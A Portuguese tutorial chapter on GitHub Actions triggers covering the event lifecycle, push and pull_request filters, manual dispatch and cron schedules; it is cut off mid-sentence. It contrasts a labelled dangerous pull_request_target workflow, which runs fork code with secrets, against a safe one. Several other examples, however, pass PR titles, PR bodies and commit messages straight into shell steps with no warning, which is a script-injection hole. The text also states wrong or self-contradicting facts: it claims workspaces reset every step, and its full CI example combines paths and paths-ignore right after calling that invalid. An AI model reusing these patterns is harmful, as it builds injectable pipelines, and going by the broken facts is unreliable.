---
layout: default
title: "03-triggers-eventos"
---

# Capitulo 3 — Triggers e Eventos

> *"Todo workflow comeca com um evento. Entenda os eventos e voce domina o CI/CD."*

---

## Objetivos de Aprendizado

1. Entender o lifecycle completo de eventos no GitHub Actions
2. Configurar todos os tipos de triggers com profundidade
3. Combinar triggers com OR e AND para cenarios complexos
4. Proteger contra event injection attacks
5. Usar workflow_run para encadear workflows
6. Dominar a sintaxe de cron para agendamentos avancados
7. Implementar bots de deploy e moderacao via comentarios
8. Usar repository_dispatch para integracao com sistemas externos

---

## 3.1 Event Lifecycle Completo

### Visao Geral do Fluxo

Quando um evento acontece no GitHub, ele segue um caminho bem definido
ate chegar ao codigo que voce escreveu no workflow. Entender esse fluxo
e essencial para debuggar problemas e otimizar seus workflows.

### Diagrama ASCII Completo do Lifecycle

```
+=====================================================================+
|                      GITHUB EVENT LIFECYCLE                          |
+=====================================================================+

  [1] EVENTO ORIGEM
  ------------------
  Um evento acontece no GitHub:
    - Push para uma branch
    - Pull Request aberto
    - Issue criada
    - Release publicado
    - Comentario adicionado
    - Tag criada
    - Dispatch manual via API
    - Cron schedule atingido
    - Outro workflow completou
    |
    v
  [2] WEBHOOK RECEBIDO
  --------------------
  GitHub envia um webhook POST para o repositorio
  com o payload completo do evento:
    {
      "action": "opened",
      "pull_request": { ... },
      "repository": { ... },
      "sender": { ... }
    }
    |
    v
  [3] WORKFLOWS FILTRADOS
  -----------------------
  GitHub verifica TODOS os arquivos em .github/workflows/
  e identifica quais tem o trigger correspondente ao evento:
    |
    +-- Workflow A: on: push: branches: [main]  --> MATCH (se push para main)
    +-- Workflow B: on: pull_request             --> MATCH (se evento e PR)
    +-- Workflow C: on: schedule: cron           --> NAO MATCH (nao e push/PR)
    +-- Workflow D: on: push: paths: [src/**]   --> MATCH (se mudancas em src/)
    |
    v
  [4] FILTROS APLICADOS
  ---------------------
  Para cada workflow que fez match, GitHub aplica
  todos os filtros configurados:
    |
    +-- branches: [main, develop]           --> Branch esta na lista?
    +-- paths: [src/**, tests/**]           --> Arquivos alterados casam?
    +-- paths-ignore: [docs/**]             --> Arquivos ignorados excluidos?
    +-- types: [opened, synchronize]        --> Tipo do evento e valido?
    +-- activity_types: [...]               --> Filtro de atividade?
    |
    v
  [5] WORKFLOW INSTANCIADO
  -----------------------
  Se TODOS os filtros passaram, o workflow e instanciado:
    |
    +-- Copia do repositorio e feita (ou secao especifica do historico)
    +-- Secrets disponibilizados (se autorizados)
    +-- Variaveis de ambiente configuradas
    +-- Contextos preenchidos (github, env, matrix, etc.)
    +-- Runner selecionado (self-hosted ou GitHub-hosted)
    |
    v
  [6] JOBS AGENDADOS
  -----------------
  Jobs SAO independentes e podem rodar em paralelo:
    |
    +-- Job A (runs-on: ubuntu-latest)  --> Runner ubuntu-latest alocado
    +-- Job B (runs-on: windows-latest) --> Runner windows-latest alocado
    +-- Job C (needs: [A, B])           --> Aguarda A e B concluirem
    |
    v
  [7] STEPS EXECUTADOS
  -------------------
  Dentro de CADA job, steps rodam sequencialmente:
    |
    +-- Step 1: Checkout (actions/checkout@v4)
    +-- Step 2: Setup (actions/setup-node@v4)
    +-- Step 3: Install (npm ci)
    +-- Step 4: Build (npm run build)
    +-- Step 5: Test (npm test)
    +-- Step 6: Deploy (condicional)
    |
    v
  [8] RESULTADO FINAL
  ------------------
  Cada job retorna um resultado:
    +-- success   (0)     --> Verde no UI
    +-- failure   (1+)    --> Vermelho no UI
    +-- cancelled         --> Amarelo no UI
    +-- skipped           --> Cinza no UI
    |
    v
  [9] EVENTOS DERIVADOS
  --------------------
  Baseado no resultado, eventos derivados sao emitidos:
    |
    +-- workflow_run (conclusion: success/failure)
    +-- Status check para o commit
    +-- Comentario no PR (se configurado)
    +-- Notificacao (se configurado)
    |
    v
  [10] CICLO REPETE
  ----------------
  O proximo evento inicia o ciclo novamente.
```

### Detalhamento de Cada Fase

#### Fase 1: Origem do Evento

O GitHub monitora inumeras acoes nos repositorios e as converte em
eventos padronizados. Cada evento tem um `payload` JSON contendo todos
os dados relevantes. O campo `github.event_name` identifica o tipo do
evento, enquanto `github.event` fornece os dados especificos.

Eventos de push contem commits, ref, e informacoes do autor. Eventos de
pull_request contem dados do PR, incluindo o head e base. Eventos de
release contem tags, assets e metadados. Cada tipo de evento tem sua
propria estrutura de dados.

#### Fase 2: Webhook e Recebimento

O webhook e o mecanismo de comunicacao entre o GitHub e o Actions.
Quando um evento acontece, o GitHub envia um POST request para o endpoint
de webhooks do Actions. Esse payload e verificado contra o HMAC secret
para garantir autenticidade.

O timeout do webhook e de 10 segundos. Se o Actions nao responder nesse
periodo, o GitHub marca o evento como falha e nao reenvia automaticamente.

#### Fase 3-4: Filtragem e Validacao

A filtragem acontece em duas camadas. Primeiro, o GitHub verifica se o
`event_name` do evento corresponde a algum `on` configurado. Segundo,
aplica os filtros especificos (branches, paths, types) configurados
dentro do trigger.

Essa filtragem e feita NO SERVIDOR DO GITHUB, nao no runner. Isso signi-
fica que workflows que nao fazem match nao consomem minutos de runner,
economizando recursos.

#### Fase 5: Instanciacao do Workflow

Quando um workflow passa por todos os filtros, ele e instanciado com:
- Uma copia do repositorio no commit especifico
- Acesso aos secrets configurados (conforme permissao)
- Os contextos github.* preenchidos com dados do evento
- Variaveis de ambiente do repositorio, organizacao e secrets
- O valor de `github.sha` com o SHA do commit que triggerou
- O valor de `github.ref` com a branch ou tag que foi pushada

#### Fase 6-7: Execucao

Jobs sao executados em runners que sao VMs temporarias. Cada runner
tem um workspace temporario que comeca limpo a cada step. Para manter
estado entre steps do mesmo job, voce deve usar `actions/cache` ou
`actions/upload-artifact` e `actions/download-artifact`.

Steps dentro de um job rodam sequencialmente, mas jobs independentes
rodam em paralelo. A ordem de execucao dos jobs e controlada pelo
atributo `needs`.

#### Fase 8-10: Resultado e Derivacoes

O resultado de cada job determina se o workflow como um todo foi bem-
sucedido. Se qualquer job falhar (e nao tiver `continue-on-error: true`),
os jobs dependentes serao cancelados. O resultado final e emitido como
evento `workflow_run` que pode ser consumido por outros workflows.

### Propriedades do Contexto github.event

O contexto `github.event` contem dados especificos do evento que
disparou o workflow. As propriedades mais comuns sao:

| Propriedade | Tipo | Descricao |
|---|---|---|
| github.event_name | string | Nome do evento (push, pull_request, etc.) |
| github.event.action | string | Acao especifica do evento (opened, closed, etc.) |
| github.event.sender | object | Quem iniciou o evento |
| github.event.repository | object | Repositorio onde o evento aconteceu |
| github.event.organization | object | Organizacao (se repositorio for de org) |
| github.event.installation | object | App installation (se aplicavel) |

Para eventos especificos, existem propriedades adicionais:

| Evento | Propriedades Especificas |
|---|---|
| push | commits, head_commit, ref, before, created, deleted |
| pull_request | pull_request (objeto completo), number, title |
| release | release (objeto completo), tag_name |
| issue_comment | issue, comment |
| discussion_comment | discussion, comment |

### Variaveis de Ambiente Padrao do GitHub Actions

Durante a execucao, o GitHub Actions disponibiliza automaticamente
várias variaveis de ambiente:

| Variavel | Descricao |
|---|---|
| GITHUB_WORKSPACE | Diretorio de trabalho do checkout |
| GITHUB_SHA | SHA do commit que triggerou |
| GITHUB_REF | Ref completa (branch ou tag) |
| GITHUB_REF_NAME | Nome da branch ou tag (sem refs/) |
| GITHUB_REF_TYPE | "branch" ou "tag" |
| GITHUB_REPOSITORY | Owner/repo do repositorio |
| GITHUB_RUN_ID | ID unico da execucao |
| GITHUB_RUN_NUMBER | Numero sequencial da execucao |
| GITHUB_JOB | ID do job atual |
| GITHUB_ACTION | ID do step atual |
| GITHUB_TRIGGERING_ACTOR | Quem triggerou (para workflow_run) |
| GITHUB_SERVER_URL | URL do GitHub (https://github.com) |
| GITHUB_API_URL | URL da API (https://api.github.com) |
| GITHUB_GRAPHQL_URL | URL do GraphQL (https://api.github.com/graphql) |
| GITHUB_ACTOR | Quem fez o push ou abriu o PR |
| GITHUB_TOKEN | Token de autenticacao automatico |
| GITHUB_RETENTION_DAYS | Dias de retencao dos artefatos |
| RUNNER_OS | OS do runner (Linux, Windows, macOS) |
| RUNNER_NAME | Nome do runner |
| RUNNER_ARCH | Arquitetura do runner (X64, ARM64) |

### Fluxo de Decisao: Workflow Roda ou Nao?

```
Evento recebido
    |
    v
Existe workflow com on:<evento>?
    |
    +-- NAO --> Nenhum workflow executado
    |
    +-- SIM
        |
        v
    Filtros de branches aplicados?
        |
        +-- Branch nao esta na lista --> Workflow NAO roda
        +-- Branch esta na lista --> Continua
            |
            v
        Filtros de paths aplicados?
            |
            +-- Nenhum path alterado casou --> Workflow NAO roda
            +-- Paths casaram --> Continua
                |
                v
            Filtros de types aplicados?
                |
                +-- Tipo nao esta na lista --> Workflow NAO roda
                +-- Tipo esta na lista --> Workflow RODA
```

### Dicas Importantes

- O `GITHUB_SHA` para push events e o SHA do ultimo commit pushado
- Para pull_request events, o `GITHUB_SHA` e o merge commit (se existir)
- O `GITHUB_REF` para PRs e `refs/pull/<number>/merge`
- Para schedule events, o workflow roda na branch default
- Workflows nao podem ser triggerados por outros workflows na mesma
  execucao (para evitar loops infinitos)
- O timeout maximo de um job e de 6 horas
- Jobs podem ter no maximo 256 steps
- Um workflow pode ter no maximo 20 jobs

---

## 3.2 Push Trigger

O trigger `push` e o mais fundamental do GitHub Actions. Ele dispara
quando commits sao enviados para branches ou tags especificas. E a base
da maioria dos pipelines de CI/CD.

### Sintaxe Basica

```yaml
on:
  push:
    branches:
      - main
    tags:
      - 'v*'
    paths:
      - 'src/**'
    paths-ignore:
      - 'docs/**'
```

### Filtragem por Branches

O filtro de branches determina para quais branches o workflow sera
executado. Voce pode especificar branches exatas ou usar patterns.

```yaml
on:
  push:
    branches:
      - main
      - develop
      - 'release/*'
      - 'feature/**'
```

Patterns suportados:
- `*` casa com qualquer caractere, exceto `/`
- `**` casa com qualquer caractere, incluindo `/`
- `+` casa com um ou mais caracteres
- `?` casa com um unico caractere
- `[abc]` casa com qualquer caractere entre colchetes

Exemplos de patterns:

| Pattern | Casa com |
|---|---|
| main | Apenas a branch main |
| release/* | release/1.0, release/2.0, release/beta |
| release/** | release/1.0, release/1.0/hotfix |
| feature/* | feature/auth, feature/login |
| feature/[a-z]* | feature/auth, mas NAO feature/123 |
| '*-stable' | v1-stable, v2-stable |

### Filtragem por Branches-ignore

O oposto de `branches`. Quando voce quer que o workflow rode em todas
as branches EXCETO as especificadas:

```yaml
on:
  push:
    branches-ignore:
      - 'feature/*'
      - 'dependabot/**'
      - 'wip-*'
```

Importante: Voce NAO pode usar `branches` e `branches-ignore` no mesmo
trigger. E um ou outro.

```yaml
# INVALIDO - gera erro
on:
  push:
    branches: [main]
    branches-ignore: [develop]  # ERRO!

# VALIDO
on:
  push:
    branches: [main]  # Apenas main
```

### Filtragem por Paths

O filtro de paths e extremamente poderoso para workflows que so devem
rodar quando arquivos especificos sao alterados. Isso reduz o numero
de execucoes desnecessarias e economiza minutos de runner.

```yaml
on:
  push:
    paths:
      - 'src/**'
      - 'tests/**'
      - 'package.json'
      - 'Cargo.toml'
      - 'requirements.txt'
      - '.github/workflows/**'
      - '!src/**/*.test.js'
```

Patterns de paths:
- `src/**` - Qualquer arquivo ou diretorio dentro de src/
- `package.json` - Apenas o arquivo package.json na raiz
- `*.yml` - Qualquer arquivo .yml na raiz
- `!src/**/*.test.js` - Exclui arquivos de teste (prefixo !)

O prefixo `!` inverte o padrão, excluindo arquivos que casam.

### Filtragem por Paths-ignore

Similar ao paths, mas no sentido inverso. Inclui tudo EXCETO os
arquivos que casam com os patterns:

```yaml
on:
  push:
    paths-ignore:
      - 'docs/**'
      - '*.md'
      - 'LICENSE'
      - '.gitignore'
      - 'CHANGELOG.md'
      - '.editorconfig'
```

Regra importante: paths e paths-ignore nao podem ser usados no mesmo
trigger. Voce deve escolher um ou outro.

```yaml
# INVALIDO
on:
  push:
    paths: [src/**]
    paths-ignore: [docs/**]  # ERRO!

# VALIDO
on:
  push:
    paths: [src/**]  # Apenas quando src/ muda
```

### Filtragem por Tags

Tags seguem a mesma sintaxe de branches para patterns:

```yaml
on:
  push:
    tags:
      - 'v*'
      - 'release-*'
      - 'v[0-9]+.[0-9]+.[0-9]+'
```

Exemplos:
- `v*` casa com v1.0.0, v2.1.3, v-beta
- `release-*` casa com release-1.0, release-beta
- `v[0-9]+.[0-9]+.[0-9]+` casa com v1.0.0, v2.3.1

Tags e branches podem ser combinados:

```yaml
on:
  push:
    branches:
      - main
    tags:
      - 'v*'
```

Neste caso, o workflow roda quando:
- Alguem faz push para a branch main, OU
- Alguem cria ou atualiza uma tag que casa com v*

### Combinando Paths com Branches

Voce pode combinar branches e paths para criar filtros muito especificos:

```yaml
on:
  push:
    branches:
      - main
      - 'release/**'
    paths:
      - 'src/**'
      - 'tests/**'
      - 'package.json'
```

O workflow so roda quando:
- O push e para main ou release/* (branch match), E
- Arquivos em src/, tests/ ou package.json foram alterados (path match)

Se o push for para main mas apenas docs mudarem, o workflow NAO roda.

### Exemplo Completo: CI com Filtros Avancados

```yaml
name: CI with Advanced Push Filters

on:
  push:
    branches:
      - main
      - 'release/**'
    paths:
      - 'src/**'
      - 'tests/**'
      - 'package.json'
      - 'tsconfig.json'
      - '.github/workflows/**'
    paths-ignore:
      - 'src/**/*.spec.ts'
      - 'src/**/*.test.ts'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint

  typecheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run typecheck

  build:
    needs: [lint, typecheck]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/

  test:
    needs: build
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - uses: actions/upload-artifact@v4
        if: matrix.node-version == 20
        with:
          name: coverage-report
          path: coverage/
```

### Variaveis Disponiveis em Push Events

Durante um push, as seguintes variaveis sao especialmente uteis:

```yaml
steps:
  - name: Show push info
    run: |
      echo "SHA: $GITHUB_SHA"
      echo "Ref: $GITHUB_REF"
      echo "Ref Name: $GITHUB_REF_NAME"
      echo "Ref Type: $GITHUB_REF_TYPE"
      echo "Actor: $GITHUB_ACTOR"
      echo "Repository: $GITHUB_REPOSITORY"
      echo "Event: $GITHUB_EVENT_NAME"
```

No contexto do evento:

```yaml
steps:
  - name: Push event details
    run: |
      echo "Before SHA: ${{ github.event.before }}"
      echo "Head commit: ${{ github.event.head_commit.message }}"
      echo "Committer: ${{ github.event.head_commit.author.name }}"
      echo "Total commits: ${{ github.event.commits }}"
      echo "Is new branch: ${{ github.event.created }}"
      echo "Is deleted: ${{ github.event.deleted }}"
```

### Dicas de Seguranca para Push

- Nunca execute scripts arbitrarios baseados no commit message
- Sempre valide o branch antes de executar acoes perigosas
- Use `if` conditions para proteger jobs de execucao indevida
- Considere usar `GITHUB_REF` para validacao em vez de `github.ref`
- Para workflows de deploy, sempre use environments com protection rules

---

## 3.3 Pull Request Trigger

O trigger `pull_request` e essencial para pipelines de CI que precisam
verificar pull requests antes do merge. Ele cobre todo o ciclo de vida
do PR, desde a abertura ate o merge.

### Tipos de Eventos (Types)

Cada tipo representa uma acao diferente no PR:

```yaml
on:
  pull_request:
    types:
      - opened
      - synchronize
      - reopened
      - edited
      - assigned
      - unassigned
      - labeled
      - unlabeled
      - ready_for_review
      - converted_to_draft
      - review_requested
      - review_request_removed
```

Detalhamento de cada tipo:

| Type | Quando Dispara | Uso Comum |
|---|---|---|
| opened | PR criado | CI inicial, verificacao de seguranca |
| synchronize | Novo commit pushado para o PR | Re-executar CI |
| reopened | PR reaberto apos fechamento | Re-executar CI |
| edited | Titulo ou corpo do PR alterado | Validar descricao |
| assigned | Responsavel atribuido ao PR | Notificacao |
| unassigned | Responsavel removido | Notificacao |
| labeled | Label adicionada | Deploy automatico |
| unlabeled | Label removida | Reverter acao |
| ready_for_review | PR marcado como pronto para review | Notificar reviewers |
| converted_to_draft | PR convertido para draft | Parar CI |
| review_requested | Review solicitado | Notificacao |
| review_request_removed | Review removido | Notificacao |

### Sintaxe Completa

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main
      - 'release/**'
    paths:
      - 'src/**'
    paths-ignore:
      - 'docs/**'
```

### Branches de Destino

O filtro `branches` no `pull_request` se refere a BRANCH DESTINO (base),
nao a branch de origem (head). Isso e uma confusao comum.

```yaml
on:
  pull_request:
    branches:
      - main          # PRs que apontam para main
      - 'release/**'  # PRs que apontam para release/*
```

Se voce quer filtrar pela branch de origem, use `branches` com o
`pull_request_target` ou use uma condicao `if` no job.

### branches-ignore para PR

```yaml
on:
  pull_request:
    branches-ignore:
      - 'dependabot/**'
      - 'wip-*'
```

Isso faz o workflow NAO rodar para PRs que apontam para branches
que casam com os patterns.

### Seguranca: pull_request vs pull_request_target

Esta e a distincao MAIS IMPORTANTE de seguranca no GitHub Actions:

**pull_request** (padrao):
- Executa no contexto do FORK (PR head)
- Nao tem acesso a secrets do repositorio base
- Nao pode escrever no repositorio base
- Seguro para forks

**pull_request_target**:
- Executa no contexto do REPOSITORIO BASE
- Tem acesso a secrets do repositorio base
- PODE escrever no repositorio base
- PERIGOSO se fizer checkout do PR head

```yaml
# PERIGOSO: pull_request_target com checkout do PR head
on:
  pull_request_target:
    types: [opened]

jobs:
  dangerous:
    runs-on: ubuntu-latest
    steps:
      # NUNCA faca isso! Um fork malicioso pode executar
      # codigo arbitrario com seus secrets
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./scripts/build.sh  # Codigo do fork e executado!
```

```yaml
# SEGURO: pull_request_target SEM checkout do PR head
on:
  pull_request_target:
    types: [opened]

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      # Checkout do BASE branch, nao do PR head
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.base.ref }}
      - run: ./scripts/build.sh  # Codigo do repositorio base
```

### Exemplo Completo: CI com Protecao

```yaml
name: PR Checks

on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches:
      - main
      - 'release/**'

jobs:
  lint:
    if: >
      !github.event.pull_request.draft &&
      !contains(github.event.pull_request.title, '[skip-ci]')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint

  test:
    if: >
      !github.event.pull_request.draft
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm test

  security:
    if: >
      github.event.pull_request.user.login != 'dependabot[bot]' &&
      github.event.pull_request.user.login != 'renovate[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --production

  coverage:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run test:coverage
      - name: Comment coverage on PR
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const coverage = JSON.parse(
              fs.readFileSync('coverage/coverage-summary.json', 'utf8')
            );
            const pct = coverage.total.lines.pct;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Coverage: ${pct}%`
            });
```

### Propriedades do Contexto para PR

```yaml
steps:
  - name: PR details
    run: |
      echo "PR Number: ${{ github.event.pull_request.number }}"
      echo "PR Title: ${{ github.event.pull_request.title }}"
      echo "PR Body: ${{ github.event.pull_request.body }}"
      echo "PR State: ${{ github.event.pull_request.state }}"
      echo "PR Draft: ${{ github.event.pull_request.draft }}"
      echo "Head SHA: ${{ github.event.pull_request.head.sha }}"
      echo "Head Branch: ${{ github.event.pull_request.head.ref }}"
      echo "Base Branch: ${{ github.event.pull_request.base.ref }}"
      echo "Author: ${{ github.event.pull_request.user.login }}"
      echo "Changed Files: ${{ github.event.pull_request.changed_files }}"
      echo "Additions: ${{ github.event.pull_request.additions }}"
      echo "Deletions: ${{ github.event.pull_request.deletions }}"
```

### Combinando push e pull_request

E pratica comum usar ambos os triggers para cobrir todos os cenarios:

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
```

Neste caso:
- Push para main executa o workflow (build + deploy)
- PR para main executa o workflow (build + test, sem deploy)

Voce pode diferenciar com condicoes:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

  deploy:
    needs: build
    if: >
      github.event_name == 'push' &&
      github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to production"
```

---

## 3.4 Workflow Dispatch (Trigger Manual)

O `workflow_dispatch` permite executar um workflow manualmente, seja
pela interface do GitHub, pela API, ou por outro workflow. E ideal
para deploys, manutencao, e operacoes que exigem intervencao humana.

### Sintaxe Completa

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Ambiente de deploy'
        required: true
        type: choice
        options:
          - staging
          - production
          - canary
        default: staging

      version:
        description: 'Versao para deploy (ex: v1.2.3)'
        required: true
        type: string
        default: 'latest'

      dry_run:
        description: 'Executar sem deploy real'
        required: false
        type: boolean
        default: false

      notify:
        description: 'Enviar notificacao Slack'
        required: false
        type: boolean
        default: true

      region:
        description: 'Regiao de deploy'
        required: false
        type: choice
        options:
          - us-east-1
          - us-west-2
          - eu-west-1
          - ap-southeast-1
        default: us-east-1
```

### Tipos de Inputs

O `workflow_dispatch` suporta quatro tipos de input:

**string** - Texto livre:

```yaml
inputs:
  commit_sha:
    description: 'SHA do commit para deploy'
    required: true
    type: string
```

**boolean** - Verdadeiro ou falso:

```yaml
inputs:
  skip_tests:
    description: 'Pular testes?'
    required: false
    type: boolean
    default: false
```

**choice** - Lista de opcoes predefinidas:

```yaml
inputs:
  environment:
    description: 'Ambiente'
    required: true
    type: choice
    options:
      - dev
      - staging
      - production
```

**number** - Numero (nao e oficialmente suportado, mas funciona em
muitas versoes do GitHub):

```yaml
inputs:
  replicas:
    description: 'Numero de replicas'
    required: false
    type: number
    default: 2
```

### Acessando Inputs

Inputs sao acessados via `inputs.<nome>` ou `github.event.inputs.<nome>`:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Show inputs
        run: |
          echo "Environment: ${{ inputs.environment }}"
          echo "Version: ${{ inputs.version }}"
          echo "Dry run: ${{ inputs.dry_run }}"
          echo "Notify: ${{ inputs.notify }}"
          echo "Region: ${{ inputs.region }}"

      - name: Conditional deploy
        if: ${{ !inputs.dry_run && inputs.environment == 'production' }}
        run: echo "Deploying to production"
```

### Acesso via API REST

Para triggerar um workflow manualmente via API:

```bash
# Listar workflows disponiveis
curl -s \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows \
  | jq '.workflows[] | {name, path, state}'

# Triggerar workflow via API
curl -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/deploy.yml/dispatches \
  -d '{
    "ref": "main",
    "inputs": {
      "environment": "production",
      "version": "1.2.3",
      "dry_run": false,
      "region": "us-east-1"
    }
  }'

# Verificar status da ultima execucao
curl -s \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/deploy.yml/runs \
  | jq '.workflow_runs[0] | {id, status, conclusion, created_at}'
```

### Acesso via GitHub CLI (gh)

```bash
# Listar workflows
gh workflow list

# Triggerar workflow com inputs
gh workflow run deploy.yml \
  -f environment=production \
  -f version=1.2.3 \
  -f dry_run=false

# Triggerar workflow em branch especifica
gh workflow run deploy.yml \
  --ref release/v2 \
  -f environment=staging

# Verificar status da execucao
gh run list --workflow=deploy.yml --limit=5

# Observar execucao em tempo real
gh run watch <run-id>
```

### Acesso via Outro Workflow

```yaml
name: Downstream Workflow

on:
  workflow_dispatch:
    inputs:
      source_run_id:
        description: 'ID do workflow upstream'
        required: true
        type: string

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Get upstream artifacts
        uses: actions/github-script@v7
        with:
          script: |
            const runs = await github.rest.actions.listWorkflowRunArtifacts({
              owner: context.repo.owner,
              repo: context.repo.repo,
              run_id: ${{ inputs.source_run_id }}
            });
            console.log('Artifacts:', runs.data.artifacts);
```

### Exemplo Completo: Deploy Manual com Validacao

```yaml
name: Manual Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Ambiente de destino'
        required: true
        type: choice
        options:
          - staging
          - production
      version:
        description: 'Tag ou branch para deploy'
        required: true
        type: string
      confirm_production:
        description: 'Confirmar deploy em producao (true/false)'
        required: false
        type: boolean
        default: false

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Validate inputs
        run: |
          if [[ "${{ inputs.environment }}" == "production" && \
                "${{ inputs.confirm_production }}" != "true" ]]; then
            echo "ERROR: Production deploy requires confirmation"
            exit 1
          fi

      - name: Validate version exists
        run: |
          git ls-remote --tags origin | grep -q "${{ inputs.version }}"
          if [ $? -ne 0 ]; then
            echo "ERROR: Version ${{ inputs.version }} not found"
            exit 1
          fi

  deploy-staging:
    needs: validate
    if: inputs.environment == 'staging'
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}
      - run: echo "Deploying ${{ inputs.version }} to staging"

  deploy-production:
    needs: validate
    if: inputs.environment == 'production'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}
      - run: echo "Deploying ${{ inputs.version }} to production"
```

### Seguranca para Workflow Dispatch

- Use environments com protection rules para deploys criticos
- Implemente validacao de inputs no inicio do workflow
- Limite quem pode triggerar via permissao do repositorio
- Use `required_reviewers` nos environments para producao
- Registre todos os dispatches para auditoria

---

## 3.5 Schedule (Cron)

O trigger `schedule` permite executar workflows em horarios
predefinidos usando sintaxe cron. E util para manutencao, backups,
verificacoes de seguranca, e build noturnos.

### Sintaxe Cron do GitHub Actions

```yaml
on:
  schedule:
    # minuto (0-59) hora (0-23) dia (1-31) mes (1-12) dia_semana (0-6, 0=dom)
    - cron: '0 2 * * *'          # Todo dia as 2h UTC
    - cron: '30 14 * * 1-5'      # Seg-Sex as 14:30 UTC
    - cron: '0 0 1 * *'          # Dia 1 de cada mes
    - cron: '*/15 * * * *'       # A cada 15 minutos
    - cron: '0 8-18 * * 1-5'     # A cada hora das 8h as 18h, Seg-Sex
    - cron: '0 0 * * 0'          # Todo domingo as 0h UTC
    - cron: '0 6,18 * * *'       # As 6h e 18h todo dia
```

### Referencia de Expressoes Cron

| Campo | Valores | Permitido | Descricao |
|---|---|---|---|
| Minuto | 0-59 | *, - / | Minuto da hora |
| Hora | 0-23 | *, - / | Hora do dia |
| Dia | 1-31 | *, - / | Dia do mes |
| Mes | 1-12 | *, - / | Mes do ano |
| Dia Semana | 0-6 | *, - / | Dia da semana (0=dom) |

### Símbolos Especiais

| Simbolo | Descricao | Exemplo |
|---|---|---|
| * | Qualquer valor | `* * * * *` = todo minuto |
| - | Intervalo | `1-5 * * * *` = minutos 1 a 5 |
| , | Lista | `0,30 * * * *` = 0 e 30 |
| / | Step | `*/15 * * * *` = a cada 15 |

### Padroes Comuns de Cron

**Diario as 2h UTC (noturno)**:

```yaml
on:
  schedule:
    - cron: '0 2 * * *'
```

**Segunda a Sexta as 9h UTC**:

```yaml
on:
  schedule:
    - cron: '0 9 * * 1-5'
```

**A cada hora**:

```yaml
on:
  schedule:
    - cron: '0 * * * *'
```

**A cada 30 minutos**:

```yaml
on:
  schedule:
    - cron: '*/30 * * * *'
```

**Todo domingo as 3h UTC**:

```yaml
on:
  schedule:
    - cron: '0 3 * * 0'
```

**Dia 1 e 15 de cada mes as 6h UTC**:

```yaml
on:
  schedule:
    - cron: '0 6 1,15 * *'
```

**Segunda a Sexta, a cada hora das 8h as 18h**:

```yaml
on:
  schedule:
    - cron: '0 8-18 * * 1-5'
```

**Ultimo dia de cada mes as 23h UTC**:

```yaml
on:
  schedule:
    - cron: '0 23 28-31 * *'
```

### Timezone Handling

O GitHub Actions usa UTC por padrao. Para converter horarios locais
para UTC:

| Horario Local | UTC Equivalente | Cron |
|---|---|---|
| 02:00 BRT (Brasilia) | 05:00 UTC | `0 5 * * *` |
| 09:00 EST (Nova York) | 14:00 UTC | `0 14 * * 1-5` |
| 09:00 PST (California) | 17:00 UTC | `0 17 * * 1-5` |
| 09:00 CET (Berlin) | 08:00 UTC | `0 8 * * 1-5` |
| 09:00 JST (Tokyo) | 00:00 UTC | `0 0 * * 1-5` |

Importante: O GitHub Actions NAO suporta timezone no campo `cron`.
Voce DEVE calcular manualmente o equivalente em UTC.

### Limitacoes dos Schedules

1. **Minimum interval**: O menor intervalo e de 5 minutos
2. **Resolution**: Schedules nao sao executados com precisao de
